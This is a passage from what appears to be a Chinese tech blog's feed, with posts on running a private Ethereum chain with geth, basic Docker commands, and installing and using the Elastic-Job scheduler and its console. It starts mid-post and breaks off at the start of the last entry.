class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>chainId</td><td>区块链网络ID，以太坊公网网络 ID 是 1，私有链节点的时候要指定不同的网络 ID</td></tr><tr><td>HomesteadBlock</td><td>设置为 0 表示使用 Homestead 发布该链</td></tr><tr><td>nonce</td><td>一个 64 位随机数，用于挖矿</td></tr><tr><td>timestamp</td><td>设置创世块的时间戳</td></tr><tr><td>parentHash</td><td>上一个区块的hash，创世块就为0</td></tr><tr><td>mixhash</td><td>与 nonce 配合用于挖矿，由上一个区块的一部分生成的hash</td></tr><tr><td>difficulty</td><td>设置设置当前区块的难度，越大挖矿就越难</td></tr><tr><td>alloc</td><td>用来预置账号以及账号的以太币数量</td></tr><tr><td>coinbase</td><td>矿工账号</td></tr><tr><td>extraData</td><td>附加信息</td></tr><tr><td>gasLimit</td><td>用来限制区块能包含的交易信息总和</td></tr></tbody></table><p>初始化区块链：</p><blockquote><p>geth –datadir data  init genesis.json</p></blockquote><p>初始化成功后，会在数据目录 data 中生成 geth 和 keystore 两个文件夹。</p><p>如果出现错误，可以移除原来的创世块，再次初始化区块链。</p><blockquote><p>geth removedb –datadir data</p></blockquote><h4 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h4><p>进入控制台：</p><blockquote><p>geth –datadir data –networkid 15 console</p></blockquote><p>启动挖矿：</p><blockquote><p>miner.start(5)</p></blockquote><p>线程数：5，第一次启动会先生成 DAG 文件，等进度达到 100% 后就开始挖矿，挖到一个区块奖励 5 个以太币，挖矿所得的奖励会进入矿工的账户，默认是本地账户中的第一个账户。</p><p>设置挖矿账户（默认第1个）：</p><blockquote><p>miner.setEtherbase(eth.accounts[0])</p></blockquote><p>查询账户余额：</p><blockquote><p>eth.getBalance(eth.accounts[0])</p></blockquote><p>返回值的单位是wei，即以太币的最小单位，1个以太币 &#x3D; 10的18次方个wei。</p><p>要查看有多少个以太币，可以换算成以太币：</p><blockquote><p>web3.fromWei(eth.getBalance(eth.accounts[0]),’ether’)</p></blockquote><p>停止挖矿：</p><blockquote><p>miner.stop()</p></blockquote><p>交易转账：</p><p>&#x2F;&#x2F; 转账 10 个以太币</p><blockquote><p>amount &#x3D; web3.toWei(10,’ether’)<br>eth.sendTransaction({from:eth.accounts[0],to:eth.accounts[1],value:amount})</p></blockquote><p>报错了，原因是账户每隔一段时间就会被锁住，要发送交易，必须先解锁账户，由于我们要从账户0发送交易，所以要解锁账户0：</p><blockquote><p>personal.unlockAccount(eth.accounts[0])</p></blockquote><p>如果发现金额还到账，此时交易已经提交到区块链，但还未被处理，这可以通过 txpool 来查看交易池中的状态：</p><blockquote><p>txpool.status</p></blockquote><pre class="line-numbers language-none"><code class="language-none">&#123;  pending: 1,  queued: 0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中 pending: 1 表示还未被处理，要启动挖矿，然后等挖到一个区块之后就停止挖矿：</p><blockquote><p>miner.start(1);<br>admin.sleepBlocks(1);<br>miner.stop()</p></blockquote><p>查看区块数：</p><blockquote><p>eth.blockNumber</p></blockquote><p>退出控制台：</p><blockquote><p>exit</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链怎么学习？</title>
      <link href="/2025/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%8E%E4%B9%88%E5%AD%A6%E4%B9%A0%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%8E%E4%B9%88%E5%AD%A6%E4%B9%A0%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="区块链技术"><a href="#区块链技术" class="headerlink" title="区块链技术"></a>区块链技术</h2><p>区块链最初是由一位化名中本聪的人为比特币（一种数字货币）而设计出的一种特殊的数据库技术。从数据的角度来看，区块链是一种把区块以链的方式组合在一起的数据结构，它能够使参与者对全网交易记录的事件顺序和当前状态建立共识。</p><p>区块链概括起来是指通过去中心化和去信任的方式集体维护一个可靠数据库的技术。区块链涉及的技术关键点包括：去中心化、去信任、集体维护、可靠数据库、时间戳、非对称加密等。</p><p>区块链重新定义了网络中信用的生成方式，在系统中，参与者无需了解其他人的背景资料，也不需要借助第三方机构的担保或保证，区块链保障了系统对价值转移的活动进行记录、传输、存储，其最后的结果一定是可信的。</p><h2 id="区块链平台"><a href="#区块链平台" class="headerlink" title="区块链平台"></a>区块链平台</h2><p>区块链使用方式分为开源项目、商业解决方案、区块链云服务、现有区块链四种方式。技术影响力按面积大小进行区分，面积越大影响力越大，技术成熟度按颜色深浅进行区分，颜色越深技术越成熟。</p><p><img src="https://pic3.zhimg.com/50/v2-19a95fde8188a956be92bdf8b9e9f6f2_hd.png" alt="image"></p><p>可以看出以比特币、以太坊、HyperLedger为代表的这三种区块链技术方案最为成熟，所以要学习区块链技术，就学习以太坊平台就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker核心概念、安装、端口映射及常用操作命令</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Docker/Docker%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5%E3%80%81%E5%AE%89%E8%A3%85%E3%80%81%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E5%8F%8A%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Docker/Docker%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5%E3%80%81%E5%AE%89%E8%A3%85%E3%80%81%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E5%8F%8A%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="一、Docker简介"><a href="#一、Docker简介" class="headerlink" title="一、Docker简介"></a>一、Docker简介</h3><ul><li>Docker是开源应用容器引擎，轻量级容器技术。</li><li>基于Go语言，并遵循Apache2.0协议开源</li><li>Docker可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的Linux系统上，也可以实现虚拟化</li><li>容器完全使用沙箱技术，相互之间不会有任何接口</li><li>类似于虚拟机技术(vmware、vitural)，但docker直接运行在操作系统(Linux)上，而不是运行在虚拟机中，速度快，性能开销极低</li></ul><p><strong>白话文，简介就是:</strong></p><blockquote><p>Docker支持将软件编译成一个镜像，然后在镜像中各种软件做好配置，将镜像发布出去，其他使用者可以直接使用这个镜像。<br>运行中的这个镜像称为容器，容器启动是非常快速的。类似windows里面的ghost操 作系统，安装好后什么都有了。</p></blockquote><h3 id="二、Docker核心概念"><a href="#二、Docker核心概念" class="headerlink" title="二、Docker核心概念"></a>二、Docker核心概念</h3><ul><li>docker镜像(Images)：Docker镜像是用于创建Docker容器的模板</li><li>docker容器(Container)：镜像启动后的一个实例称为容器，容器是独立运行的一个或一组应用，</li><li>docker客户端(Client)：客户端通过命令行或其他工具使用Docker API(<a href="https://docs.docker.com/reference/api/docker_remote_api)%E4%B8%8EDocker%E7%9A%84%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B%E8%BF%9B%E8%A1%8C%E9%80%9A%E4%BF%A1">https://docs.docker.com/reference/api/docker_remote_api)与Docker的守护进程进行通信</a></li><li>docker主机(Host)：一个物理或虚拟的机器用来执行Docker守护进程和容器</li><li>docker仓库(Registry)：Docker仓库用来存储镜像，可以理解为代码控制中的代码仓库，Docker Hub(<a href="https://hub.docker.com/">https://hub.docker.com</a>) 提供了庞大的镜像集合供使用</li></ul><h3 id="三、Docker安装及启停"><a href="#三、Docker安装及启停" class="headerlink" title="三、Docker安装及启停"></a>三、Docker安装及启停</h3><h4 id="1-查看centos版本"><a href="#1-查看centos版本" class="headerlink" title="1. 查看centos版本"></a>1. 查看centos版本</h4><blockquote><p>Docker 要求 CentOS 系统的内核版本高于 3.10</p></blockquote><p>通过命令：</p><pre class="line-numbers language-none"><code class="language-none">uname -r<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前centos版本，如版本不符，需升级系统版本</p><h4 id="2-升级软件包及内核-可选"><a href="#2-升级软件包及内核-可选" class="headerlink" title="2 升级软件包及内核(可选)"></a>2 升级软件包及内核(可选)</h4><pre class="line-numbers language-none"><code class="language-none">yum update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-安装docker"><a href="#3-安装docker" class="headerlink" title="3. 安装docker"></a>3. 安装docker</h4><pre class="line-numbers language-none"><code class="language-none">yum install docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-启动docker"><a href="#4-启动docker" class="headerlink" title="4. 启动docker"></a>4. 启动docker</h4><pre class="line-numbers language-none"><code class="language-none">systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-将docker服务设为开机启动"><a href="#5-将docker服务设为开机启动" class="headerlink" title="5. 将docker服务设为开机启动"></a>5. 将docker服务设为开机启动</h4><pre class="line-numbers language-none"><code class="language-none">systemtctl enable docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-停止docker"><a href="#5-停止docker" class="headerlink" title="5. 停止docker"></a>5. 停止docker</h4><pre class="line-numbers language-none"><code class="language-none">systemtctl stop docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="四、Docker常用命令及操作"><a href="#四、Docker常用命令及操作" class="headerlink" title="四、Docker常用命令及操作"></a>四、Docker常用命令及操作</h3><h4 id="4-1-docker镜像命令"><a href="#4-1-docker镜像命令" class="headerlink" title="4.1 docker镜像命令"></a>4.1 docker镜像命令</h4><blockquote><p>通常情况下，Docker的镜像都放在Docker的官网 Docker Hub上，<a href="https://hub.docker.com/explore/">点此前往官网</a></p></blockquote><h5 id="4-1-1-镜像检索"><a href="#4-1-1-镜像检索" class="headerlink" title="4.1.1 镜像检索"></a>4.1.1 镜像检索</h5><p>除了可以在<a href="https://hub.docker.com/explore/">Docker Hub</a>上搜索镜像外，还可以通过命令 <code>docker search xxx</code> 进行搜索，下面以 mysql 为例：</p><pre class="line-numbers language-none"><code class="language-none">docker search mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/1900599-b0939b50cc4738ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><h5 id="4-1-2-镜像下载"><a href="#4-1-2-镜像下载" class="headerlink" title="4.1.2 镜像下载"></a>4.1.2 镜像下载</h5><p>下载命名为：<code>docker pull 镜像名:tag</code>，其中<code>tag</code>多为系统的版本，可选的，默认为<code>least</code>。</p><pre class="line-numbers language-none"><code class="language-none">docker pull mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-1-3-镜像列表"><a href="#4-1-3-镜像列表" class="headerlink" title="4.1.3 镜像列表"></a>4.1.3 镜像列表</h5><p>获取已下载镜像列表命令：<code>docker images</code></p><p><img src="https://upload-images.jianshu.io/upload_images/1900599-c339bb96f54cbabc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><p>其中，</p><p><code>RESPOSITORY</code>为镜像名<br><code>TAG</code>为镜像版本，<code>least</code>代表最新版<br><code>IMAGE_ID</code>为该镜像唯一ID<br><code>CREATED</code>为该镜像创建时间<br><code>SIZE</code>为该镜像大小</p><h5 id="4-1-1-镜像删除"><a href="#4-1-1-镜像删除" class="headerlink" title="4.1.1 镜像删除"></a>4.1.1 镜像删除</h5><p>删除指定镜像：</p><pre class="line-numbers language-none"><code class="language-none">docker rmi image-id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有镜像：</p><pre class="line-numbers language-none"><code class="language-none">docker rmi $(docker images -q)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-容器操作"><a href="#4-2-容器操作" class="headerlink" title="4.2 容器操作"></a>4.2 容器操作</h4><blockquote><p>可以理解为软件下载(下载QQ)–&gt;安装(QQ)–&gt;运行(QQ)的过程。<br>下面以Tomcat为例</p></blockquote><h5 id="4-2-1-搜索镜像"><a href="#4-2-1-搜索镜像" class="headerlink" title="4.2.1 搜索镜像"></a>4.2.1 搜索镜像</h5><pre class="line-numbers language-none"><code class="language-none">docker search tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-2-2-下载镜像"><a href="#4-2-2-下载镜像" class="headerlink" title="4.2.2 下载镜像"></a>4.2.2 下载镜像</h5><pre class="line-numbers language-none"><code class="language-none">docker pull tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-2-3-根据镜像启动容器"><a href="#4-2-3-根据镜像启动容器" class="headerlink" title="4.2.3 根据镜像启动容器"></a>4.2.3 根据镜像启动容器</h5><p>最简单的运行镜像为容器的命令如下：</p><pre class="line-numbers language-none"><code class="language-none">docker run --name container-name -d image-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行一个容器，使用<code>docker run</code>命令即可。</p><p><code>-- name</code>：为容器起一个名称<br><code>-d</code>：detached，执行完这句命令后，控制台将不会阻塞，可以继续输入命令操作<br><code>image-name</code>：要运行的镜像名称</p><h5 id="4-2-4-查看运行中容器"><a href="#4-2-4-查看运行中容器" class="headerlink" title="4.2.4 查看运行中容器"></a>4.2.4 查看运行中容器</h5><p>可通过如下命令，查看运行中的容器列表：</p><pre class="line-numbers language-none"><code class="language-none">docker ps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://upload-images.jianshu.io/upload_images/1900599-f620ae32f4356669.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><p><code>CONTAINER ID</code>：启动时生成的ID<br><code>IMAGE</code>：该容器使用的镜像<br><code>COMMAND</code>：容器启动时执行的命令<br><code>CREATED</code>：容器创建时间<br><code>STATUS</code>：当前容器状态<br><code>PORTS</code>：当前容器所使用的默认端口号<br><code>NAMES</code>：启动时给容器设置的名称</p><h5 id="4-2-5-停止运行中容器"><a href="#4-2-5-停止运行中容器" class="headerlink" title="4.2.5 停止运行中容器"></a>4.2.5 停止运行中容器</h5><p>通过以下命令来停止运行中的容器：</p><pre class="line-numbers language-none"><code class="language-none">docker stop container-name&#x2F;container-id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-2-5-查看所有的容器"><a href="#4-2-5-查看所有的容器" class="headerlink" title="4.2.5 查看所有的容器"></a>4.2.5 查看所有的容器</h5><p>通过以下命令可查看运行和停止的所有容器：</p><pre class="line-numbers language-none"><code class="language-none">docker ps -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-2-6-启动容器"><a href="#4-2-6-启动容器" class="headerlink" title="4.2.6 启动容器"></a>4.2.6 启动容器</h5><p>通过以下命令启动容器：</p><pre class="line-numbers language-none"><code class="language-none">docker start container-name&#x2F;container-id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-2-7-删除容器"><a href="#4-2-7-删除容器" class="headerlink" title="4.2.7 删除容器"></a>4.2.7 删除容器</h5><p>删除单个容器：</p><pre class="line-numbers language-none"><code class="language-none">docker rm container-id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有容器：</p><pre class="line-numbers language-none"><code class="language-none">docker rm $(docker ps -a -q )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-2-8-启动做端口映射的容器"><a href="#4-2-8-启动做端口映射的容器" class="headerlink" title="4.2.8 启动做端口映射的容器"></a>4.2.8 启动做端口映射的容器</h5><p>Docker运行容器之后却发现没IP，没端口，也就是说，启动容器的时候如果不指定对应参数，在容器外部是无法通过网络来访问容器内的网络应用和服务的。 所以需要通过Docker端口映射来实现网络访问。</p><p>Docker的端口映射通过<code>-p</code>参数实现，命令如下：</p><pre class="line-numbers language-none"><code class="language-none">docker run --name tomcat1 -d tomcatdocker run --name tomcat2 -d -p 8888:8080 tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如上，就把主机端口8888请求映射到Docker容器内部端口8080了。</p><p>执行完这两条命令后，通过<code>docker ps</code>查看：</p><p><img src="https://upload-images.jianshu.io/upload_images/1900599-86662f6e11bef5e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><p>通过<code>PORTS</code>可以看出，<code>tomcat2</code>是做了端口映射的，<code>tomcat1</code>是没进行映射过的。</p><p>分别通过浏览器访问：</p><p><code>http://*.*.*.*:8080/</code> &#x2F;&#x2F; tomcat1默认端口</p><p><code>http://*.*.*.*:8888/</code> &#x2F;&#x2F;</p><p>做过端口映射的Tomcat2，8888会转发请求到tomcat2的8080<br>结果如下：</p><pre class="line-numbers language-none"><code class="language-none">第一个请求是无法请求到的，原因开篇处说过了。第二个请求是可以正常进行请求的，会由tomcat2容器进行处理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>端口映射格式：</p><pre class="line-numbers language-none"><code class="language-none">ip:hostport:containerport  #指定ip、指定主机port、指定容器portip::containerport        #指定ip、未指定主机port、指定容器porthostport:container         #未指定ip port、指定主机port、指定容器port  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="4-2-9-查看容器日志"><a href="#4-2-9-查看容器日志" class="headerlink" title="4.2.9 查看容器日志"></a>4.2.9 查看容器日志</h5><p>查看当前容器日志，可通过如下命令：</p><pre class="line-numbers language-none"><code class="language-none">docker logs container-id&#x2F;container-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-2-10-查看端口映射"><a href="#4-2-10-查看端口映射" class="headerlink" title="4.2.10 查看端口映射"></a>4.2.10 查看端口映射</h5><p>可以通过如下命令查看容器映射了哪些端口及协议：</p><pre class="line-numbers language-none"><code class="language-none">docker port container-id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>示例：</p><pre class="line-numbers language-none"><code class="language-none">[root@docker ~]#docker port 46114af6b44e8080&#x2F;tcp -&gt; 0.0.0.0:8888[root@docker ~]#docker port cea668ee4db0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果返回空，则代表没进行端口映射。</p><h5 id="4-2-11-登录退出容器"><a href="#4-2-11-登录退出容器" class="headerlink" title="4.2.11 登录退出容器"></a>4.2.11 登录退出容器</h5><p>运行中的容器其实是一个功能完备的Linux操作系统，所以我们可以像常规系统一样进行登陆及退出操作。</p><p>登录命令为：</p><pre class="line-numbers language-none"><code class="language-none">docker exec -it container-id&#x2F;container-name bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>退出命令为：</p><pre class="line-numbers language-none"><code class="language-none">exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-2-12-更多操作命令"><a href="#4-2-12-更多操作命令" class="headerlink" title="4.2.12 更多操作命令"></a>4.2.12 更多操作命令</h5><blockquote><p>更多命令可以参考：<br><a href="https://docs.docker.com/engine/reference/commandline/docker/">https://docs.docker.com/engine/reference/commandline/docker/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Job - 分布式作业调度解决方案</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Elastic%20Job/Elastic%20Job%20-%20%E5%88%86%E5%B8%83%E5%BC%8F%E4%BD%9C%E4%B8%9A%E8%B0%83%E5%BA%A6%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Elastic%20Job/Elastic%20Job%20-%20%E5%88%86%E5%B8%83%E5%BC%8F%E4%BD%9C%E4%B8%9A%E8%B0%83%E5%BA%A6%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Elastic-Job是一个分布式调度解决方案，由两个相互独立的子项目Elastic-Job-Lite和Elastic-Job-Cloud组成。</p><p>Elastic-Job-Lite定位为轻量级无中心化解决方案，使用jar包的形式提供分布式任务的协调服务。</p><h4 id="功能列表"><a href="#功能列表" class="headerlink" title="功能列表"></a>功能列表</h4><p><strong>1、任务分片</strong></p><ul><li>将整体任务拆解为多个子任务</li><li>可通过服务器的增减弹性伸缩任务处理能力</li><li>分布式协调，任务服务器上下线的全自动发现与处理</li></ul><p><strong>2、 多任务类型</strong></p><ul><li>基于时间驱动的任务</li><li>基于数据驱动的任务（TBD）</li><li>同时支持常驻任务和瞬时任务</li><li>多语言任务支持</li></ul><p><strong>3、云原生</strong></p><ul><li>完美结合Mesos或Kubernetes等调度平台</li><li>任务不依赖于IP、磁盘、数据等有状态组件</li><li>合理的资源调度，基于Netflix的Fenzo进行资源分配</li></ul><p><strong>4、容错性</strong></p><ul><li>支持定时自我故障检测与自动修复</li><li>分布式任务分片唯一性保证</li><li>支持失效转移和错过任务重触发</li></ul><p><strong>5、任务聚合</strong></p><ul><li>相同任务聚合至相同的执行器统一处理</li><li>节省系统资源与初始化开销</li><li>动态调配追加资源至新分配的任务</li></ul><p><strong>6、易用性</strong></p><ul><li>完善的运维平台</li><li>提供任务执行历史数据追踪能力</li><li>注册中心数据一键dump用于备份与调试问题</li></ul><h4 id="整体架构图"><a href="#整体架构图" class="headerlink" title="整体架构图"></a>整体架构图</h4><p><strong>Elastic-Job-Lite</strong></p><p><img src="http://img.javastack.cn/18-2-24/59132374.jpg" alt="image"></p><p><strong>Elastic-Job-Cloud</strong></p><p><img src="http://ovfotjrsi.bkt.clouddn.com/docs/img/architecture/elastic_job_cloud.png" alt="image"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote><p>官网：<a href="http://elasticjob.io/index_zh.html/">http://elasticjob.io/index_zh.html\</a><br>码云：<a href="https://gitee.com/elasticjob/">https://gitee.com/elasticjob\</a><br>GitHub：<a href="https://github.com/elasticjob/elastic-job/">https://github.com/elasticjob/elastic-job\</a><br>采用公司：<a href="http://elasticjob.io/docs/elastic-job-lite/00-overview/company">http://elasticjob.io/docs/elastic-job-lite/00-overview/company</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Elastic Job </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式作业 Elastic Job 如何动态调整</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Elastic%20Job/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BD%9C%E4%B8%9A%20Elastic%20Job%20%E5%A6%82%E4%BD%95%E5%8A%A8%E6%80%81%E8%B0%83%E6%95%B4/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Elastic%20Job/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BD%9C%E4%B8%9A%20Elastic%20Job%20%E5%A6%82%E4%BD%95%E5%8A%A8%E6%80%81%E8%B0%83%E6%95%B4/</url>
      
        <content type="html"><![CDATA[<p>前面分享了两篇分布式作业调度框架 Elastic Job 的介绍及应用实战。</p><ul><li><p><a href="https://mp.weixin.qq.com/s/1W1zI28riaWN9k3HHBL9Kw">ElasticJob－分布式作业调度神器</a></p></li><li><p><a href="https://mp.weixin.qq.com/s/QCssypUN4ayVfVcpjZRg7A">分布式作业 Elastic Job 快速上手指南！</a></p></li></ul><p>Elastic Job 提供了简单易用的运维平台，方便用户监控、动态修改作业参数、作业操作及查询作业。</p><h4 id="设计理念"><a href="#设计理念" class="headerlink" title="设计理念"></a>设计理念</h4><p>运维平台和elastic-job-lite并无直接关系，是通过读取作业注册中心数据展现作业状态，或更新注册中心数据修改全局配置。</p><p>控制台只能控制作业本身是否运行，但不能控制作业进程的启动，因为控制台和作业本身服务器是完全分离的，控制台并不能控制作业服务器。</p><h4 id="功能列表"><a href="#功能列表" class="headerlink" title="功能列表"></a>功能列表</h4><ul><li><p>登录安全控制</p></li><li><p>注册中心、事件追踪数据源管理</p></li><li><p>快捷修改作业设置</p></li><li><p>作业和服务器维度状态查看</p></li><li><p>操作作业禁用\启用、停止和删除等生命周期</p></li><li><p>事件追踪查询</p></li></ul><h4 id="不支持项"><a href="#不支持项" class="headerlink" title="不支持项"></a>不支持项</h4><ul><li>添加作业</li></ul><p>作业在首次运行时将自动添加，Elastic-Job-Lite 以 <code>jar</code> 方式启动，并无作业分发功能。如需完全通过运维平台发布作业，请使用 <code>Elastic-Job-Cloud</code>。</p><h4 id="运维平台搭建"><a href="#运维平台搭建" class="headerlink" title="运维平台搭建"></a>运维平台搭建</h4><p><strong>1、在官网下载最新稳定的源码包，地址如下。</strong></p><blockquote><p><a href="https://github.com/elasticjob/elastic-job-lite">https://github.com/elasticjob/elastic-job-lite</a></p></blockquote><p>这里我们下载了最新的 <code>2.1.5</code> 的最新发布包。</p><p><strong>2、编译下载后的源码包</strong></p><p>下载后，随便解压到哪个目录，然后执行 <code>mvn install</code> 编译。</p><pre class="line-numbers language-none"><code class="language-none">cd d:&#x2F;elastic-job-lite-2.1.5mvn install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="http://img.javastack.cn/18-3-19/70978286.jpg"></p><p><strong>3、启动运维平台</strong></p><p>在编译目录 <code>d:\elastic-job-lite-2.1.5\elastic-job-lite\elastic-job-lite-console\target</code> 找到编译后的包： <code>elastic-job-lite-console-2.1.5.tar.gz</code> ，然后解压到 <code>elastic-job-lite-console-2.1.5</code> ，并执行 <code>bin</code> 目录下的 <code>start.bat</code> 即可启动，Linux下为 <code>start.sh</code>。</p><p><img src="http://img.javastack.cn/18-3-19/67592187.jpg"></p><p><code>8899</code> 为默认端口号，可通过启动脚本输入 <code>-p</code> 自定义端口号。</p><p><strong>4、访问运维平台</strong></p><p>Elastic-Job 提供了两种账户：管理员及访客。管理员拥有全部操作权限，访客仅拥有察看权限。默认管理员用户名和密码是 <code>root/root</code>，访客用户名和密码是 <code>guest/guest</code>，可通过 <code>conf\auth.properties</code> 修改管理员及访客用户名及密码。</p><pre class="line-numbers language-none"><code class="language-none">root.username&#x3D;rootroot.password&#x3D;rootguest.username&#x3D;guestguest.password&#x3D;guest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>打开浏览器访问 <code>http://localhost:8899/</code> 输出用户名和密码即可访问控制台。</p><p><img src="http://img.javastack.cn/18-3-19/91428457.jpg"></p><p><strong>5、连接到注册中心</strong></p><p>运维平台搭建完后，需要添加目标注册中心，再进行连接。</p><p><img src="http://img.javastack.cn/18-3-19/89674953.jpg"></p><p><strong>6、作业操作</strong></p><p>我们可以对作业配置进行修改、查看详情、失效、终止、手动触发作业等操作，但终止作业后，需要重启工程才能重新启动作业，控制台不能手动启动。</p><p><img src="http://img.javastack.cn/18-3-19/94019933.jpg"></p><p>好了，这节的 Elastic-Job 运维平台搭建使用指南就到这里了。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Elastic Job </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式作业 Elastic-Job 快速上手指南</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Elastic%20Job/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BD%9C%E4%B8%9A%20Elastic-Job%20%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Elastic%20Job/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BD%9C%E4%B8%9A%20Elastic-Job%20%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/</url>
      
